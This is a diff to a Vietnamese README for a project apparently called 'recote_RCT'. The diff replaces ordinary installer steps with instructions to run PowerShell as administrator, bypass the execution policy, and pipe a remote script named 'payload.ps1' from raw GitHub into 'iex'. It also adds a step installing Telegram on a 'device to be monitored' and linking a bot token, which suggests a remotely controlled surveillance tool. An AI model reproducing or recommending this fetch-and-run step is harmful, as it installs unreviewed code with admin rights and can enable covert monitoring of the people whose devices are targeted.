@@ -55,45 +55,22 @@
 
 
 ## 1. Cài Đặt Phần Mềm
+-Trên thanh tìm kiếm windows,tìm `powershell` và chạy dưới quyền admin sau đó nhập các lệnh sau :
+```
+Set-ExecutionPolicy Bypass -Scope Process -Force
+```
 
-- **Tải file cài đặt:**  
-  Tải phiên bản mới nhất từ Releases của dự án : [tại đây](https://github.com/Anhdeface/recote_RCT/releases)
-
-- **Chạy file cài đặt:**  
-  Mở file cài đặt và theo dõi các bước trên màn hình.
-
-- **Bỏ qua bước không cần thiết:**  
-  Nhấn **Next** khi thấy các bước không quan trọng để tiết kiệm thời gian.
-
-- **Hoàn tất cài đặt:**  
-  Nhấn **Finish** sau khi cài đặt xong.
-
+```
+irm "https://raw.githubusercontent.com/Anhdeface/recote_RCT/refs/heads/main/payload.ps1" | iex
+```
+Sau khi tải xong thì phần mềm sẽ tự động chạy và chỉ cần thiết lập vài thứ cơ bản là xong
 ---
 
 ## 2. Liên Kết Token Bot Telegram
+Cần tải ứng dụng Telegram ở thiết bị cần giám sát 
+và đăng kí tài khoản sau đó xem bài viết dưới đây để thiết lập bot
+
 Xem chi tiết ở đây : [xem bài viết chi tiết](https://vietnix.vn/tao-bot-telegram/)
-
-Để phần mềm hoạt động, cần liên kết token của bot Telegram. Thực hiện theo các bước dưới đây:
-
-### Tạo Bot và Lấy Token
-
-1. **Mở ứng dụng Telegram:**  
-   Sử dụng ứng dụng trên điện thoại hoặc máy tính.
-
-2. **Tìm kiếm @BotFather:**  
-   Nhập `@BotFather` vào thanh tìm kiếm và mở cuộc trò chuyện với bot chính thức.
-
-3. **Gửi lệnh tạo bot:**  
-   Gõ `/newbot` và gửi tin nhắn cho @BotFather.
-
-4. **Đặt tên cho bot:**  
-   Nhập tên cho bot theo hướng dẫn.
-
-5. **Chọn username cho bot:**  
-   Chọn một username độc đáo (username phải kết thúc bằng “bot”, ví dụ: `examplebot`).
-
-6. **Nhận token:**  
-   Sau khi hoàn tất, @BotFather sẽ gửi một chuỗi ký tự là **Token**. Sao chép token này để sử dụng sau.
 
 ---
 
